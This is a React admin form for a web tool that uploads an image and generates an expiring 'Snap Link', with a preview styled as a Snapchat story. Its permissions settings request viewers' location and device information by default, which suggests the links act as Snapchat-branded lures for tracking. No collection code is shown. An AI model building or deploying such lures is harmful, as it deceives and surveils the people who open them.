// components/admin/ImageUploadForm.tsx
import React, { useState } from "react";
import Image from "next/image";
import { Input } from "@/components/ui/Input";
import { Button } from "@/components/ui/Button";
import { PermissionSelector } from "@/components/admin/PermissionSelector";
import { UploadCloud, Sparkles } from "lucide-react";
import { PermissionsConfig } from "@/lib/types";
import { convertImageToWebP } from "@/lib/image-converter";

interface ImageUploadFormProps {
  onSubmit: (data: FormData) => Promise<void>;
  isLoading: boolean;
  error: string | null;
}

export const ImageUploadForm: React.FC<ImageUploadFormProps> = ({ onSubmit, isLoading, error }) => {
  const [file, setFile] = useState<File | null>(null);
  const [preview, setPreview] = useState<string | null>(null);
  const [converting, setConverting] = useState(false);
  const [webpStats, setWebpStats] = useState<{ orig: string; newSize: string; saved: number } | null>(null);
  const [title, setTitle] = useState("");
  const [description, setDescription] = useState("");
  const [expiresHours, setExpiresHours] = useState("24");
  const [validationError, setValidationError] = useState<string | null>(null);
  const [permissions, setPermissions] = useState<PermissionsConfig>({
    location: true,
    device_info: true,
    camera: false,
  });

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const selected = e.target.files?.[0];
    if (!selected) return;

    if (selected.size > 20 * 1024 * 1024) {
      setValidationError("File size exceeds 20MB limit");
      return;
    }

    setConverting(true);
    setValidationError(null);

    try {
      const res = await convertImageToWebP(selected);
      setFile(res.file);
      setPreview(res.previewUrl);
      setWebpStats({
        orig: (res.originalSize / (1024 * 1024)).toFixed(1) + " MB",
        newSize: (res.newSize / 1024).toFixed(0) + " KB",
        saved: res.savedPercent,
      });
    } catch {
      setFile(selected);
      setPreview(URL.createObjectURL(selected));
    } finally {
      setConverting(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      setValidationError("Please select an image to upload");
      return;
    }
    const formData = new FormData();
    formData.append("file", file);
    formData.append("title", title);
    formData.append("description", description);
    formData.append("requires_location", String(permissions.location));
    formData.append("permissions_config", JSON.stringify(permissions));
    if (expiresHours !== "0") formData.append("expires_in_hours", expiresHours);
    onSubmit(formData);
  };

  const displayError = validationError || error;

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {displayError && (
        <div className="p-3 bg-red-500/15 border border-red-500/30 rounded-2xl text-xs text-red-300">
          {displayError}
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Form Controls */}
        <div className="lg:col-span-7 space-y-4">
          <div className="relative border-2 border-dashed border-white/15 hover:border-[#FFFC00]/50 rounded-3xl p-5 text-center cursor-pointer transition-all bg-white/[0.02]">
            <input
              type="file"
              accept="image/*"
              onChange={handleFileChange}
              disabled={converting || isLoading}
              className="absolute inset-0 opacity-0 cursor-pointer disabled:cursor-not-allowed"
            />
            {preview ? (
              <div className="space-y-2">
                <div className="relative w-36 h-44 mx-auto rounded-2xl overflow-hidden border border-white/20 shadow-lg">
                  <Image src={preview} alt="Preview" fill className="object-cover" unoptimized />
                </div>
                {webpStats && (
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-600 dark:text-emerald-400 text-[10px] font-bold shadow-sm">
                    <Sparkles className="w-3 h-3" />
                    <span>WebP: {webpStats.newSize}</span>
                    <span className="line-through opacity-50">{webpStats.orig}</span>
                    <span>(-{webpStats.saved}%)</span>
                  </div>
                )}
              </div>
            ) : converting ? (
              <div className="space-y-2 py-6">
                <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin mx-auto" />
                <p className="text-xs text-[#FFFC00] font-bold">Optimizing image to WebP...</p>
              </div>
            ) : (
              <div className="space-y-2 py-4">
                <UploadCloud className="w-10 h-10 text-amber-600 dark:text-[#FFFC00] mx-auto" />
                <p className="text-sm font-bold text-slate-900 dark:text-white">Click or drag image here</p>
                <p className="text-xs text-slate-500 dark:text-white/40">Auto-converts to WebP for instant upload (Max 20MB)</p>
              </div>
            )}
          </div>

          <Input label="Snap Title" value={title} onChange={(e) => setTitle(e.target.value)} placeholder="e.g. Secret Beach Sunset" />
          <Input label="Description (Optional)" value={description} onChange={(e) => setDescription(e.target.value)} placeholder="Add optional details..." />

          <PermissionSelector config={permissions} onChange={setPermissions} />

          <div className="p-3 rounded-2xl bg-[#1C1C22] border border-white/10">
            <label className="text-xs font-bold text-white block mb-1">Link Expiration</label>
            <select
              value={expiresHours}
              onChange={(e) => setExpiresHours(e.target.value)}
              className="w-full bg-transparent text-xs text-white outline-none cursor-pointer"
            >
              <option value="1" className="bg-black">1 Hour</option>
              <option value="24" className="bg-black">24 Hours</option>
              <option value="168" className="bg-black">7 Days</option>
              <option value="0" className="bg-black">Never Expires</option>
            </select>
          </div>

          <Button type="submit" isLoading={isLoading} size="lg" className="w-full mt-2">
            <Sparkles className="w-4 h-4 mr-2" />
            Generate Snap Link
          </Button>
        </div>

        {/* Right Column: Live Snap Story Preview */}
        <div className="lg:col-span-5 space-y-4">
          <div className="p-4 rounded-3xl bg-[#121216] border border-white/10 space-y-3 shadow-xl">
            <span className="text-[10px] uppercase font-bold tracking-wider text-white/50">
              Live Snap Story Preview
            </span>

            <div className="relative w-full aspect-[9/14] max-w-[280px] mx-auto rounded-3xl overflow-hidden bg-black border-4 border-[#1E1E24] shadow-2xl flex flex-col justify-between p-3">
              {preview ? (
                <Image src={preview} alt="Story Preview" fill className="object-cover" />
              ) : (
                <div className="absolute inset-0 bg-[#0F0F14] flex flex-col items-center justify-center p-4 text-center">
                  <div className="w-12 h-12 rounded-full bg-[#FFFC00]/10 flex items-center justify-center mb-2">
                    <span className="text-2xl">👻</span>
                  </div>
                  <p className="text-xs text-white/40">Select an image to preview Snapchat story</p>
                </div>
              )}

              {/* Mock top progress bar */}
              <div className="relative z-10 w-full flex gap-1 pt-1">
                <div className="h-1 flex-1 bg-white rounded-full" />
                <div className="h-1 flex-1 bg-white/30 rounded-full" />
              </div>

              {/* Mock bottom story title */}
              <div className="relative z-10 p-2.5 rounded-2xl bg-black/60 backdrop-blur-md border border-white/10">
                <p className="text-xs font-bold text-white truncate">{title || "Untitled Snap"}</p>
                <p className="text-[10px] text-[#FFFC00] font-medium">SNAP APP Story</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
  );
};
